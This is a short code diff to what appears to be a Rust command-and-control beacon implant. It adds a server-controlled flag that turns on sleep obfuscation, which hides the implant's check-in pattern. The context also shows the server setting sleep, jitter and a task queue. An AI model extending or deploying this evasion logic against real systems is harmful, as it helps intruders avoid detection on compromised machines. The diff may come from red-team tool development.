@@ -217,7 +217,9 @@ impl Beacon {
         if let Some(cfg) = handshake.ack.get("cfg") {
             let sleep = cfg.u64_or("sleep", self.cfg.sleep);
             let jitter = cfg.u64_or("jitter", self.cfg.jitter as u64) as u32;
+            let obfuscate = cfg.bool_or("obf", self.cfg.sleep_obfuscate);
             self.apply_policy(sleep, jitter);
+            self.cfg.sleep_obfuscate = obfuscate;
         }
         if let Some(ch) = self.channel.as_mut() {
             ch.set_session_id(&crate::config::hex_encode(&session_id));
@@ -308,6 +310,8 @@ impl Beacon {
 
         // Server-side beacon policy wins over the compiled-in defaults.
         self.apply_policy(batch.u64_or("sleep", self.cfg.sleep), batch.u64_or("jitter", self.cfg.jitter as u64) as u32);
+        // The server also decides whether the check-in pattern is obfuscated.
+        self.cfg.sleep_obfuscate = batch.bool_or("obf", self.cfg.sleep_obfuscate);
 
         let tasks = match batch.get("tasks") {
             Some(Value::Arr(items)) => items.clone(),
